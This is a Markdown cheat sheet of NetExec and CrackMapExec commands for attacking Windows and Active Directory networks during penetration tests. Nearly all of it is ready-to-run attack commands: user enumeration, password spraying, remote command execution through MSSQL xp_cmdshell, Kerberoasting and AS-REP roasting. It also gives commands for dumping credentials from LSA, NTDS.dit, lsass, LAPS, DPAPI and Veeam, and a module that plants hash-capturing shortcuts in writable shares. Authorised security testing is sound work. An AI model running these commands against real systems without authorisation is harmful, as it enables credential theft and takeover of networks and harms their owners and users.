# NetExec and CrackMapExec Cheat Sheet
A cheat sheet for NetExec and CrackMapExec, featuring useful commands and modules for different services to use during Pentesting

- NetExec: https://github.com/Pennyw0rth/NetExec
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec (no longer maintained)
- Installation: https://www.netexec.wiki/getting-started/installation

## Table of Contents
- [Enumeration](#enumeration)
- [Spraying](#spraying)
- [SMB](#smb)
- [FTP](#ftp)
- [LDAP](#ldap)
- [MSSQL](#mssql)
- [Secrets Dump](#secrets-dump)
- [Asreproast](#asreproast)
- [Bloodhound](#bloodhound)
- [Useful Modules](#useful-modules)
- [Resources](#resources)

# Enumeration
## Initial Enumeration
```bash
netexec smb target
```
## Null Authentication
```bash
netexec smb target -u '' -p ''
```
## Guest Authentication
```bash
netexec smb target -u 'guest' -p ''
```
## List Shares
```bash
netexec smb target -u '' -p '' --shares
```
```bash
netexec smb target -u username -p password --shares
```
## List Usernames
```bash
netexec smb target -u '' -p '' --users
```
```bash
netexec smb target -u '' -p '' --rid-brute
```
```bash
netexec smb target -u username -p password --users
```
## Local Authentication
```bash
netexec smb target -u username -p password --local-auth
```
## Using Kerberos
```bash
netexec smb target -u username -p password -k
```
## Check for hosts that have SMB signing disabled
```bash
netexec smb target(s) --gen-relay-list relay.txt
```
# Spraying
## Password Spray
```bash
netexec smb target -u users.txt -p password --continue-on-success
```
```bash
netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
```
```bash
netexec ssh target -u username -p password --continue-on-success
```
# SMB
## All In One
```bash
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```
## Spider_plus Module
```bash
netexec smb target -u username -p password -M spider_plus
```
```bash
netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false
```
## Dump a specific file
```bash
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```
# FTP
## List folders and files
```bash
netexec ftp target -u username -p password --ls
```
## List files inside a folder
```bash
netexec ftp target -u username -p password --ls folder_name
```
## Retrieve a specific file
```bash
netexec ftp target -u username -p password --ls folder_name --get file_name
```
# LDAP
## Enumerate users using ldap
```bash
netexec ldap target -u '' -p '' --users
```
## All In One
```bash
netexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
```
## Kerberoast
```bash
netexec ldap target -u username -p password --kerberoasting kerb.txt
```
## ASREProast
```bash
netexec ldap target -u username -p password --asreproast asrep.txt
```
# MSSQL
## Authentication
```bash
netexec mssql target -u username -p password
```
## Execute commands using `xp_cmdshell`
> -X for powershell and -x for cmd
```bash
netexec mssql target -u username -p password -x command_to_execute
```
## Get a file
```bash
netexec mssql target -u username -p password --get-file output_file target_file
```
# Secrets Dump
## Dump LSA secrets
```bash
netexec smb target -u username -p password --local-auth --lsa
```
## gMSA
```bash
netexec ldap target -u username -p password --gmsa-convert-id id
```
```bash
netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```
## Group Policy Preferences
```bash
netexec smb target -u username -p password -M gpp_password
```
## Dump LAPS v1 and v2 password
```bash
netexec smb target -u username -p password --laps
```
## Dump dpapi credentials
```bash
netexec smb target -u username -p password --laps --dpapi
```
## Dump NTDS.dit
```bash
netexec smb target -u username -p password --ntds
```
# Bloodhound
```bash
netexec ldap target -u username -p password --bloodhound -ns ip --collection All
```
# Useful Modules
## Webdav
Checks whether the WebClient service is running on the target
```bash
netexec smb ip -u username -p password -M webdav 
```
## Veeam
Extracts credentials from local Veeam SQL Database
```bash
netexec smb target -u username -p password -M veeam
```
## slinky
Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
```bash
netexec smb ip -u username -p password -M slinky 
```
## ntdsutil
Dump NTDS with ntdsutil
```bash
netexec smb ip -u username -p password -M ntdsutil 
```
## ldap-checker
Checks whether LDAP signing and binding are required and/or enforced
```bash
cme ldap target -u username -p password -M ldap-checker
```
## Check if the DC is vulnerable to zerologon, petitpotam, nopac
```bash
netexec smb target -u username -p password -M zerologon
```
```bash
netexec smb target -u username -p password -M petitpotam
```
```bash
netexec smb target -u username -p password -M nopac
```
## Check the MachineAccountQuota
```bash
netexec ldap target -u username -p password -M maq
```
## ADCS Enumeration
```bash
netexec ldap target -u username -p password -M adcs
```
## Dump lsass
```bash
netexec smb target -u username -p password -M lsassy
```
## Retrieve MSOL account password
```bash
netexec smb target -u username -p password -M msol
```
# Resources
- https://www.netexec.wiki/
- https://www.rayanle.cat/lehack-2024-netexec-workshop-writeup/
